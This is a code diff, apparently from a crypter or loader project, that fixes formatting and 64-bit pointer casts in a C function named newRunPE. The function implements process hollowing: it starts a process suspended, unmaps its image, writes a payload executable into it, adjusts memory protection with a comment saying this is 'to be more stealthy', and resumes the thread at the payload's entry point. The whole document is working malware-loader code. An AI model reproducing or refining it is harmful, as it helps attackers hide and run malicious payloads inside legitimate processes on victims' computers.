@@ -371,60 +371,60 @@ void newRunPE(LPSTR szFilePath, PVOID pFile, LPTSTR commandLine) {
 
 		IDH = (PIMAGE_DOS_HEADER) pFile;
 
-			if (IDH->e_magic == IMAGE_DOS_SIGNATURE) {
-				INH = (PIMAGE_NT_HEADERS)(((DWORD) pFile) + IDH->e_lfanew);
+		if (IDH->e_magic == IMAGE_DOS_SIGNATURE) {
+			INH = (PIMAGE_NT_HEADERS)(((DWORD) pFile) + IDH->e_lfanew);
 
-				// Patch payload subsystem to avoid crashes
-				INH->OptionalHeader.Subsystem = IMAGE_SUBSYSTEM_WINDOWS_GUI;
+			// Patch payload subsystem to avoid crashes
+			INH->OptionalHeader.Subsystem = IMAGE_SUBSYSTEM_WINDOWS_GUI;
 
-				if (INH->Signature == IMAGE_NT_SIGNATURE) {
-					RtlZeroMemory(&SI, sizeof(SI));
-					RtlZeroMemory(&PI, sizeof(PI));				
+			if (INH->Signature == IMAGE_NT_SIGNATURE) {
+				RtlZeroMemory(&SI, sizeof(SI));
+				RtlZeroMemory(&PI, sizeof(PI));				
 
-					// Create new instance of target process		
-					if (CreateProcessA(szFilePath, commandLine, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI)) {
-						CTX = (LPCONTEXT) VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE);
-						CTX->ContextFlags = CONTEXT_FULL;
+				// Create new instance of target process		
+				if (CreateProcessA(szFilePath, commandLine, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI)) {
+					CTX = (LPCONTEXT) VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE);
+					CTX->ContextFlags = CONTEXT_FULL;
 
-						// Get image base of target process
-						if (GetThreadContext(PI.hThread, CTX)) {
-							ReadProcessMemory(PI.hProcess, (LPCVOID)(CTX->Ebx + (sizeof(SIZE_T) * 2)), (LPVOID)(&dwImageBase), sizeof(PVOID), NULL);
+					// Get image base of target process
+					if (GetThreadContext(PI.hThread, CTX)) {
+						ReadProcessMemory(PI.hProcess, (LPCVOID)(CTX->Ebx + (sizeof(SIZE_T) * 2)), (LPVOID)(&dwImageBase), sizeof(PVOID), NULL);
 
-							// Unmap old image
-							if (((DWORD)(dwImageBase)) == INH->OptionalHeader.ImageBase) {
-								xNtUnmapViewOfSection = (NtUnmapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection"));
-								xNtUnmapViewOfSection(PI.hProcess, (PVOID)(dwImageBase));
+						// Unmap old image
+						if (((DWORD)(dwImageBase)) == INH->OptionalHeader.ImageBase) {
+							xNtUnmapViewOfSection = (NtUnmapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection"));
+							xNtUnmapViewOfSection(PI.hProcess, (PVOID)(dwImageBase));
+						}
+
+						// Allocate new memory in target process for the payload
+						pImageBase = VirtualAllocEx(PI.hProcess, (LPVOID)(INH->OptionalHeader.ImageBase), INH->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+						if (pImageBase) {
+							// Write payload headers and sections into target process
+							WriteProcessMemory(PI.hProcess, pImageBase, pFile, INH->OptionalHeader.SizeOfHeaders, NULL);
+
+							for (Count = 0; Count < INH->FileHeader.NumberOfSections; Count++) {
+								ISH = (PIMAGE_SECTION_HEADER)((DWORD)(pFile) + IDH->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (Count * sizeof(IMAGE_SECTION_HEADER)));
+								WriteProcessMemory(PI.hProcess, (LPVOID)((DWORD)(pImageBase) + ISH->VirtualAddress), (LPVOID)((DWORD)(pFile) + ISH->PointerToRawData), ISH->SizeOfRawData, NULL);
 							}
 
-							// Allocate new memory in target process for the payload
-							pImageBase = VirtualAllocEx(PI.hProcess, (LPVOID)(INH->OptionalHeader.ImageBase), INH->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+							// Fix image base
+							WriteProcessMemory(PI.hProcess, (LPVOID)(CTX->Ebx + (sizeof(SIZE_T) * 2)), (LPVOID)(&INH->OptionalHeader.ImageBase), sizeof(PVOID), NULL);
 
-							if (pImageBase) {
-								// Write payload headers and sections into target process
-								WriteProcessMemory(PI.hProcess, pImageBase, pFile, INH->OptionalHeader.SizeOfHeaders, NULL);
+							// Fix memory protection after write to be more stealthy							
+							VirtualProtectEx(PI.hProcess, pImageBase, INH->OptionalHeader.SizeOfImage, PAGE_EXECUTE_READ, oldProtect);
 
-								for (Count = 0; Count < INH->FileHeader.NumberOfSections; Count++) {
-									ISH = (PIMAGE_SECTION_HEADER)((DWORD)(pFile) + IDH->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (Count * sizeof(IMAGE_SECTION_HEADER)));
-									WriteProcessMemory(PI.hProcess, (LPVOID)((DWORD)(pImageBase) + ISH->VirtualAddress), (LPVOID)((DWORD)(pFile) + ISH->PointerToRawData), ISH->SizeOfRawData, NULL);
-								}
+							// Set new entry point and resume target main thread
+							CTX->Eax = (DWORD)(pImageBase) + INH->OptionalHeader.AddressOfEntryPoint;
 
-								// Fix image base
-								WriteProcessMemory(PI.hProcess, (LPVOID)(CTX->Ebx + (sizeof(SIZE_T) * 2)), (LPVOID)(&INH->OptionalHeader.ImageBase), sizeof(PVOID), NULL);
-
-								// Fix memory protection after write to be more stealthy							
-								VirtualProtectEx(PI.hProcess, pImageBase, INH->OptionalHeader.SizeOfImage, PAGE_EXECUTE_READ, oldProtect);
-
-								// Set new entry point and resume target main thread
-								CTX->Eax = (DWORD)(pImageBase) + INH->OptionalHeader.AddressOfEntryPoint;
-
-								// Set target thread context and resume main thread
-								SetThreadContext(PI.hThread, CTX);
-								ResumeThread(PI.hThread);							
-							}
+							// Set target thread context and resume main thread
+							SetThreadContext(PI.hThread, CTX);
+							ResumeThread(PI.hThread);							
 						}
 					}
 				}
 			}
+		}
 		VirtualFree(pFile, 0, MEM_RELEASE);	
 	#endif
 	
@@ -435,7 +435,7 @@ void newRunPE(LPSTR szFilePath, PVOID pFile, LPTSTR commandLine) {
 		PROCESS_INFORMATION PI;    			// Process Information
 		STARTUPINFOA SI;           			// Start Up Information
 		LPCONTEXT CTX;              		// Context Frame
-		PDWORD dwImageBase;        			// Source image base
+		PDWORD64 dwImageBase;        		// Source image base
 		NtUnmapViewOfSection xNtUnmapViewOfSection;
 		LPVOID pImageBase;					// Destination image base
 		PDWORD oldProtect;					// Old memory protection settings
@@ -444,7 +444,7 @@ void newRunPE(LPSTR szFilePath, PVOID pFile, LPTSTR commandLine) {
 		IDH = (PIMAGE_DOS_HEADER) pFile;
 
 		if (IDH->e_magic == IMAGE_DOS_SIGNATURE) {
-			INH = (PIMAGE_NT_HEADERS)(((DWORD) pFile) + IDH->e_lfanew);
+			INH = (PIMAGE_NT_HEADERS)(((DWORD64) pFile) + IDH->e_lfanew);
 			
 			// Patch payload subsystem to avoid crashes
 			INH->OptionalHeader.Subsystem = IMAGE_SUBSYSTEM_WINDOWS_GUI;
@@ -463,7 +463,7 @@ void newRunPE(LPSTR szFilePath, PVOID pFile, LPTSTR commandLine) {
 						ReadProcessMemory(PI.hProcess, (PVOID)(CTX->Rdx + (sizeof(SIZE_T) * 2)), (LPVOID)(&dwImageBase), sizeof(PVOID), NULL);
 						
 						// Unmap old image
-						if (((DWORD)(dwImageBase)) == INH->OptionalHeader.ImageBase) {
+						if (((DWORD64)(dwImageBase)) == INH->OptionalHeader.ImageBase) {
 							xNtUnmapViewOfSection = (NtUnmapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection"));
 							xNtUnmapViewOfSection(PI.hProcess, (PVOID)(dwImageBase));
 						}
@@ -476,8 +476,8 @@ void newRunPE(LPSTR szFilePath, PVOID pFile, LPTSTR commandLine) {
 							WriteProcessMemory(PI.hProcess, pImageBase, pFile, INH->OptionalHeader.SizeOfHeaders, NULL);
 						
 							for (Count = 0; Count < INH->FileHeader.NumberOfSections; Count++) {
-								ISH = (PIMAGE_SECTION_HEADER)((DWORD)(pFile) + IDH->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (Count * sizeof(IMAGE_SECTION_HEADER)));
-								WriteProcessMemory(PI.hProcess, (LPVOID)((DWORD)(pImageBase) + ISH->VirtualAddress), (LPVOID)((DWORD)(pFile) + ISH->PointerToRawData), ISH->SizeOfRawData, NULL);
+								ISH = (PIMAGE_SECTION_HEADER)((DWORD64)(pFile) + IDH->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (Count * sizeof(IMAGE_SECTION_HEADER)));
+								WriteProcessMemory(PI.hProcess, (LPVOID)((DWORD64)(pImageBase) + ISH->VirtualAddress), (LPVOID)((DWORD64)(pFile) + ISH->PointerToRawData), ISH->SizeOfRawData, NULL);
 							}
 							
 							// Fix image base
@@ -485,7 +485,7 @@ void newRunPE(LPSTR szFilePath, PVOID pFile, LPTSTR commandLine) {
 							// Fix memory protection after write to be more stealthy							
 							VirtualProtectEx(PI.hProcess, pImageBase, INH->OptionalHeader.SizeOfImage, PAGE_EXECUTE_READ, oldProtect);
 							// Set new entry point and resume target main thread
-							CTX->Rcx = (DWORD)(pImageBase) + INH->OptionalHeader.AddressOfEntryPoint;
+							CTX->Rcx = (DWORD64)(pImageBase) + INH->OptionalHeader.AddressOfEntryPoint;
 							
 							// Set target thread context and resume main thread
 							SetThreadContext(PI.hThread, CTX);
